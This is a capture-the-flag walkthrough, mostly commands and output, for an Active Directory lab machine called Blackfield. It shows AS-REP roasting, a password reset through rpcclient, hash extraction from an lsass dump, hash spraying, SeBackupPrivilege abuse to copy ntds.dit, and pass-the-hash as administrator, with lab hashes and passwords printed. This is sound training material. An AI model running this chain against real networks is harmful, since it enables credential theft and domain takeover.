# Nmap:
```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-01 09:28:25Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  tcpwrapped
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49676/tcp open  tcpwrapped
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 7h00m00s
| smb2-time: 
|   date: 2023-07-01T09:28:34
|_  start_date: N/A
```


# Got access to smb profile$ option, gt users:

```bash
└─$ smbclient //10.10.10.192/profiles$ -U anonymous -c ls | awk '{print $1 }' > users
```
# Try to get TGT using GetNPUsers.py:

```bash
└─$ GetNPUsers.py blackfield.local/ -no-pass -usersfile users -dc-ip 10.10.10.192 > GetNPUsers
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$support@BLACKFIELD.LOCAL:958c9465faa0d453cfae0895a0394950$21c1ccd46c1e0eb45392f4cc264eba871b1f6d22b31b35a87a747429dc8a09752c105c3e92c63973b474d9fb50d6ef00787b452695ee191ee6a2b13564b34fa2914f1d5bd6543884810932d3f84931abb92d1686c9aace12a454c23cd0706baa38b8453ef0a10504980533b1a2014ae7da722548f681458cdbd2737e492b1d5b7d1f9fc2384fc688ba19c394d02d120e96b8e21e28ce2527bfb06c850a2a85f137dc1a5d14cfc4d0ac0d5555545cb9b28e657ed8bf64e2dec369dea45e62843a1a5d2660bc32f9d2050ca0a2083069cad51c2ee1703b9f1dff3295bcd44cc084545dad813e720b2ba449d84c385da795a754f204
```


# Crack it:

```bash
└─$ hashcat hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode

85da795a754f204:#00^BlackKnight
```

# Getting bloodhound file using the bloodhound-python:

```bash
└─# bloodhound-python -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.10.10.192 -c DCOnly
```

# BY typing this raw query in the bloodhound we got:
`MATCH p=(u {owned: true})-[r1]->(n) WHERE r1.isacl=true RETURN p`

![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/addc61e7-d0ef-473a-93b8-828e4dcf265f)

# Login to rpcclient to change the password:
```bash
└─$ rpcclient -U "support" 10.10.10.192
Password for [WORKGROUP\support]:
 rpcclient $> setuserinfo audit2020 23 P@$$w0rd
```

# Try to login to carckmapexec smb:
```bash
└─$ crackmapexec smb 10.10.10.192 -u audit2020 -p 'P@$$w0rd' --shares                      
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\audit2020:P@$$w0rd 
SMB         10.10.10.192    445    DC01             [+] Enumerated shares
SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
SMB         10.10.10.192    445    DC01             -----                    -----------     ------
SMB         10.10.10.192    445    DC01             ADMIN$                         		 Remote Admin
SMB         10.10.10.192    445    DC01             C$                              		     	Default share
SMB         10.10.10.192    445    DC01             forensic      		  READ          	  Forensic / Audit share.
SMB         10.10.10.192    445    DC01             IPC$          		  READ       		  Remote IPC
SMB         10.10.10.192    445    DC01             NETLOGON        READ   	         Logon server share 
SMB         10.10.10.192    445    DC01             profiles$       	   READ            
SMB         10.10.10.192    445    DC01             SYSVOL         		READ     		   Logon server share 
```


# Login to smb in forensic share:
```bash
└─$ smbclient //10.10.10.192/forensic -U audit2020
Password for [WORKGROUP\audit2020]:
Try "help" to get a list of possible commands.
smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

> **Upon enumeration we get to know about lsass.dmp file:**


# open .DMP file using:
```bash
└─$ pypykatz lsa minidump memory_analysis/lsass.DMP  
INFO:pypykatz:Parsing file memory_analysis/lsass.DMP
FILE: ======== memory_analysis/lsass.DMP =======
-------snip--------------
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
                DPAPI: a03cd8e9d30171f3cfe8caad92fef621
        == WDIGEST [633ba]==
                username svc_backup
                domainname BLACKFIELD
                password None
                password (hex)
        == Kerberos ==
                Username: svc_backup
                Domain: BLACKFIELD.LOCAL
        == WDIGEST [633ba]==
                username svc_backup
                domainname BLACKFIELD
                password None
                password (hex)

== LogonSession ==
authentication_id 365835 (5950b)
session_id 2
username UMFD-2
domainname Font Driver Host
logon_server 
logon_time 2020-02-23T17:59:38.218491+00:00
sid S-1-5-96-0-2
luid 365835
------------------snip---------------------
```

# grep and sort the users /hashes using the cmd:
```bash
└─$ pypykatz lsa minidump lsass.DMP | grep 'Username:' | awk '{ print $2 }' | sort -u > usey

└─$ pypykatz lsa minidump memory_analysis/lsass.DMP | grep 'NT:' | awk '{ print $2 }' | sort -u > hashy 

```
# Do password spray using crcakmap exec:
```bash
└─$ crackmapexec smb 10.10.10.192 -u usey -H hashy --continue-on-success
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\svc_backup:7f1e4ff8c6a8e6b6fcae2d9c0572cd62 STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\svc_backup:b624dc83a27cc29da11d9bf25efea796 STATUS_LOGON_FAILURE 
```

# Login using eveil-winrm:
```bash
└─$ evil-winrm -i 10.10.10.192 -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d' 

Reference:https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/

PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

# Abuse the priv by making a diskshadow.txt with:
```bash
set metadata c:\Windows\System32\spool\drivers\color\george.cabs 
set context persistent nowriters 
add volume c: alias someAlias 
create 
expose %someAlias% z: 
reset
```

# Run the cmd using diskshadow.exe (make sure to copy the file at the destination)
```bash
PS C:\Users\svc_backup\Documents> diskshadow.exe /s C:\Windows\System32\spool\drivers\color\diskshadow.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  7/2/2023 2:24:49 AM

-> set metadata c:\Windows\System32\spool\drivers\color\george.cabs
-> set context persistent nowriters
-> add volume c: alias someAlias
-> create
Alias someAlias for shadow ID {2e63fe28-49ed-4e3a-8091-1df98741e724} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {283805cf-7932-4485-b865-246bc6b2d00e} set as environment variable.

Querying all shadow copies with the shadow copy set ID {283805cf-7932-4485-b865-246bc6b2d00e}

        * Shadow copy ID = {2e63fe28-49ed-4e3a-8091-1df98741e724}               %someAlias%
                - Shadow copy set: {283805cf-7932-4485-b865-246bc6b2d00e}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 7/2/2023 2:24:50 AM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %someAlias% z:
-> %someAlias% = {2e63fe28-49ed-4e3a-8091-1df98741e724}
The shadow copy was successfully exposed as z:\.
-> reset
->
```

# Download 2 .dll file to make the files copy to th elocal machine:
```
SeBackupPrivilegeUtils.dll
SeBackupPrivilegeCmdLets.dll
```

# Run the cmd:
```bash
Import-Module ./SeBackupPrivilegeCmdLets.dll
import-module .\SeBackupPrivilegeUtils.dll
Copy-FileSeBackupPrivilege z:\Windows\NTDS\ntds.dit C:\Users\svc_backup\Desktop\ntds.dit

-------- We need SYSTEM Registery Hive to decrypt the keys available in ntds file----------

 reg.exe save hklm\system c:\Users\svc_backup\Documents\system.bak
```

# Download NTDS and system file:
```bash
└─# secretsdump.py -system system.hive -ntds ntds.dit LOCAL > secretsdump
```

# Got hash, Now login using the hash:
```bash
└─$ evil-winrm -u administrator -H '184fb5e5178480be64824d4cd53b99ee' -i 10.10.10.192

OR

└─$ wmiexec.py -hashes :184fb5e5178480be64824d4cd53b99ee administrator@10.10.10.192 

```

